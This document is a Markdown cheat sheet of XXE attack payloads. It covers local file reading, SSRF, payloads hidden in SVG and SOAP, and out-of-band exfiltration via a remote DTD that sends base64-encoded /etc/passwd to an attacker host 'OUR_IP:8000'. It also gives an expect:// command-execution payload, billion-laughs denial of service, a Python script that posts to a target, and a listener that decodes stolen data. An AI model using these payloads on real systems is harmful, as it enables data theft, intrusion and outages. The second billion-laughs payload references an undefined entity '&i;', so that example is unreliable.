### üõ°Ô∏è XML External Entity (XXE) Vulnerability

**XML External Entity (XXE)** is a security vulnerability that allows an attacker to interfere with an application's processing of XML data. It occurs when an XML input containing a reference to an **external entity** is processed by a weakly configured XML parser.

  * **XML Entities:** Placeholders for data. An **External Entity** references an external resource, typically a file on the server's filesystem or a URL.
  * **Vulnerable Parsers:** Parsers that resolve external entities (e.g., `libxml2` with default settings) are susceptible.
  * **Impact:** Information disclosure (reading files), Server-Side Request Forgery (SSRF), Denial of Service (DoS), or even Remote Code Execution (RCE) in specific configurations.
  * **Root Cause:** The XML parser is configured to accept and process declarations within the Document Type Definition (DTD) that reference external resources.

-----

### üìù Basic XXE Payloads and Impact

The most common XXE attack involves defining a custom entity within the Document Type Definition (DTD) that points to a resource using a system identifier.

  * **Reading Local Files (Information Disclosure)**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <foo>&xxe;</foo>
    ```

    **Why it's used:** To confirm the vulnerability and extract sensitive system files like user lists (`/etc/passwd`) or configuration files.
    **How it works:** The payload defines an entity named `xxe`. The `SYSTEM "file:///etc/passwd"` directive tells the parser to load the content of the local file into the `xxe` entity. When the application processes the XML and attempts to substitute the `&xxe;` reference, the file's content is inserted into the application's response.

  * **Server-Side Request Forgery (SSRF)**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service/admin"> ]>
    <foo>&xxe;</foo>
    ```

    **Why it's used:** To force the vulnerable server to make HTTP requests to internal network services, potentially bypassing firewall rules.
    **How it works:** The entity definition uses an HTTP or HTTPS protocol handler (instead of `file://`). When the parser resolves this entity, the server initiates an outgoing request to the specified URL (`http://internal-service/admin`).

  * **Directory Listing and Windows Paths**

    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/"> ]><foo>&xxe;</foo>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts"> ]><foo>&xxe;</foo>
    ```

    **Why it's used:** To test the parser's capabilities and target system-specific files on Linux and Windows platforms.
    **How it works:** By referencing a directory (e.g., `file:///etc/`), the attacker checks if the parser returns an error or a listing. On Windows, the file paths must use the appropriate drive letter and directory structure (e.g., `c:/windows/...`).

-----

### üñºÔ∏è XXE in SVG and Other XML Blocks

Any file or data format that uses XML, even non-obvious ones like image formats (SVG) or standardized messages (SOAP), can be used as an injection vector.

  * **Basic XXE in SVG (Direct File Reading)**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <text>&xxe;</text>
    </svg>
    ```

    **Why it's used:** When the application allows **image uploads** (specifically SVG files) and uses an XML parser to process them before rendering.
    **How it works:** The DTD declaration is embedded in the SVG file. When the server processes the SVG (e.g., to validate or render it), the `&xxe;` entity is resolved, and the content of `/etc/passwd` is inserted into the `<text>` element of the resulting SVG output, which is then returned to the attacker.

  * **XXE in SOAP Messages**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <soap:Body>
            <foo>&xxe;</foo>
        </soap:Body>
    </soap:Envelope>
    ```

    **Why it's used:** In web services that process **SOAP requests**, typically over HTTP or HTTPS APIs.
    **How it works:** The attacker places the malicious DTD immediately after the XML declaration but before the main `<soap:Body>` tag. The parser processes the DTD and resolves the entity, achieving file access or SSRF within the context of the web service call.

-----

### ü§´ Blind XXE and Out-of-Band (OOB) Exfiltration

Blind XXE occurs when the application successfully processes the XML input but does **not display the output** (the error message or the resolved entity content) to the user. This requires an **Out-of-Band (OOB) attack** to leak data.

  * **OOB Data Exfiltration Setup**

    This technique requires the attacker to host a malicious DTD file on a controlled external server (`http://OUR_IP:8000/xxe.dtd`).

    1.  **Attacker's Malicious DTD (`xxe.dtd`):** This file defines entities that base64-encode the target file content and then send it via an HTTP request.
        ```dtd
        <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
        <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
        ```
    2.  **Attacker's Payload to Server:** This triggers the parser to fetch the malicious DTD.
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE email [
            <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
            %remote;
            %oob;
        ]><root>&content;</root>
        ```

    **Why it's used:** When the application is vulnerable but does not echo the entity's output back to the attacker (blind scenario).
    **How it works:**

    1.  The XML parser reads the **remote parameter entity** `%remote;`, fetching the external `xxe.dtd` from the attacker's server.
    2.  The `xxe.dtd` is loaded, defining a file entity (`%file;`) that reads and **Base64-encodes** the target file (`/etc/passwd`).
    3.  The DTD then defines the OOB entity (`%oob;`), which constructs a URL: `http://OUR_IP:8000/?content=...[base64 data]...`
    4.  The final entity references (`%oob;` and `&content;`) force the vulnerable server to make a **GET request back to the attacker's server**, revealing the Base64-encoded file content in the request URI.

  * **Error-Based XXE (Out-of-Band Exfiltration)**

    **Why it's used:** To exfiltrate data when the application doesn't show output but displays **error messages** containing the resolved entity values.
    **How it works:** The attacker forces the server to include the target file's content in a URL that references a non-existent local file. When the parser tries to resolve this non-existent resource, it triggers a system error that includes the full path attempted, which contains the content of the target file.

    **Example DTD (`error.dtd`):**

    ```dtd
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error; 
    ```

-----

### üåÄ Advanced Protocol and Wrapper Techniques

Attackers leverage various protocol handlers and language-specific wrappers to extend the capabilities of XXE beyond simple file reading.

  * **Base64 Encoding with PHP Wrappers**

    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> ]><foo>&xxe;</foo>
    ```

    **Why it's used:** To read binary files or files containing characters that would **break XML parsing** (like `<`, `>`, `&`).
    **How it works:** The `php://filter` wrapper is used to process the target file. The filter `convert.base64-encode` ensures the file's content is encoded into a safe Base64 string before it is returned to the XML parser, preventing parsing errors.

  * **Expect Wrapper (Remote Code Execution)**

    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://whoami"> ]><foo>&xxe;</foo>
    ```

    **Why it's used:** To achieve **Remote Code Execution (RCE)** on servers running PHP with the `expect` module enabled (a rare, high-impact scenario).
    **How it works:** The `expect://` wrapper treats the entity content (`whoami`) as a command to be executed by the operating system. The output of the command is then returned to the XML parser.

  * **Denial of Service (DoS) - Billion Laughs Attack**

    ```xml
    <!DOCTYPE data [
        <!ENTITY a "dos">
        <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
        <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
        ]><data>&c;</data>
    ```

    **Why it's used:** To consume excessive memory and CPU resources, causing the application or server to crash.
    **How it works:** This creates a deep **nested expansion** of entities. For example, resolving `&c;` requires resolving ten `&b;` entities, each resolving ten `&a;` entities. The parser's resource consumption explodes exponentially, leading to a crash.

-----

### üïµÔ∏è‚Äç‚ôÄÔ∏è Detection and Exploitation Tools

Attackers use standard penetration testing tools, often configured for OOB testing, to identify and exploit XXE vulnerabilities.

  * **Burp Suite and Collaborator**

    **Why it's used:** The **Burp Collaborator** is essential for detecting **blind XXE** vulnerabilities.
    **How it works:** The attacker embeds a unique Collaborator URL into a blind XXE payload (e.g., `<!ENTITY xxe SYSTEM "http://COLLABORATOR_ID.burpcollaborator.net/test">`). If the XML parser is vulnerable and attempts to resolve the external entity, the Collaborator records the inbound DNS or HTTP request, confirming the vulnerability.

  * **Custom Python Scripts (Automated Testing)**

    ```python
    import requests

    url = "http://vulnerable.com/process"
    payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <foo>&xxe;</foo>"""

    response = requests.post(url, data=payload)
    print(response.text)
    ```

    **Why it's used:** To quickly automate testing against known endpoints and check for immediate file content leakage in the response body.
    **How it works:** The script sends the XML payload to the target endpoint, expecting the file contents (`root:x:0:0...`) to be reflected in the HTTP response.

-----

### üåÄ Advanced Data Exfiltration Techniques

These techniques are utilized when basic XXE is blocked or when the target file contains special characters that would cause XML parsing errors.

  * **Advanced File Disclosure with CDATA**

    When reading files that contain special XML characters (like `<` or `&`), a direct entity substitution will break the XML document structure, leading to an error before the content can be viewed. The solution is to wrap the file content in a **CDATA section**.

    **Why it's used:** To read complex files (like configuration files or binary data) without causing XML parsing errors due to special characters.
    **How it works:** CDATA sections instruct the XML parser to treat the enclosed content as literal character data, ignoring any XML markup rules. This preserves the original file content exactly.

    1.  **Attacker's DTD (`xxe.dtd`) on external server:** The DTD is designed to wrap the file content in CDATA tags.

        ```dtd
        <!ENTITY % begin "<![CDATA[">
        <!ENTITY % file SYSTEM "file:///path/to/target/file">
        <!ENTITY % end "]]>">
        <!ENTITY % xxe "<!ENTITY all '%begin;%file;%end;'>">
        %xxe;
        ```

    2.  **Attacker's Payload to Vulnerable Endpoint:**

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE data [
            <!ENTITY % dtd SYSTEM "http://YOUR_SERVER/xxe.dtd">
            %dtd;
        ]><data>&all;</data>
        ```

    **Explanation:**

      * The vulnerable server fetches the DTD.
      * The parser defines `%file;` (which reads the target file).
      * The parser then defines the final entity `&all;` which concatenates the literal string `<![CDATA[`, the file content, and the literal string `]]>`.
      * When the server substitutes `&all;` in the `<data>` tag, the output remains valid XML, allowing the attacker to view the file content.

-----

### üß¨ Base64 Encoding for Robust Exfiltration

Base64 encoding is an excellent technique to ensure that complex file content, regardless of characters or line endings, can be safely transferred and decoded later.

  * **Base64 Encoding using PHP Wrappers**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> ]><foo>&xxe;</foo>
    ```

    **Why it's used:** To read files that might contain binary data or invalid XML characters, ensuring the entire content is safely returned as a clean, text-only string.
    **How it works:** The **PHP Wrapper** `php://filter` is used to preprocess the content of the file. The `convert.base64-encode` filter encodes the content of the target file (`/etc/passwd`) before the XML parser processes it. The parser then receives and returns the Base64 string, which the attacker decodes client-side. This is highly reliable for direct output XXE.

  * **Blind Out-of-band (OOB) Exfiltration with Base64**

    This combines the Base64 encoding filter with the OOB technique to exfiltrate data from a blind XXE scenario.

    1.  **Attacker's DTD (`xxe.dtd`) on external server:**

        ```dtd
        <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
        <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
        %oob;
        ```

    2.  **Attacker's Listener (e.g., Python/PHP server on port 8000):** This server captures and decodes the incoming request.

        **Python Example Handler:**

        ```python
        # Captures GET request, extracts 'content' parameter, and decodes Base64
        content = self.path.split('content=')[1]
        decoded = base64.b64decode(content).decode('utf-8')
        print(decoded)
        ```

    **Why it's used:** This is the most effective method for **Blind XXE**, where no error messages or output are returned to the attacker.
    **How it works:** The parser performs an internal Base64 encoding on the target file. The encoded result is then inserted into the **URL** that the server is forced to request from the attacker's machine. The attacker's listener captures the request and decodes the parameter value to retrieve the file content.

-----

### üí• Denial of Service (DoS) - Billion Laughs Attack

The "Billion Laughs" attack, or exponential entity expansion, is a common XXE DoS vector.

  * **The Payload**

    ```xml
    <?xml version="1.0"?><!DOCTYPE data [
        <!ENTITY a "dos">
        <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
        <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
        <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
        ]><data>&i;</data>
    ```

    **Why it's used:** To consume all available memory and CPU resources on the server, causing the application or the entire host to become unresponsive.
    **How it works:** The entity definitions are recursively nested (e.g., `&b;` is ten `&a;`s). When the parser attempts to resolve the final entity (`&i;`), the memory required to store the fully expanded string (potentially millions or billions of the string "dos") grows exponentially, exhausting the system's resources.

-----

**Made with love by VIsh0k**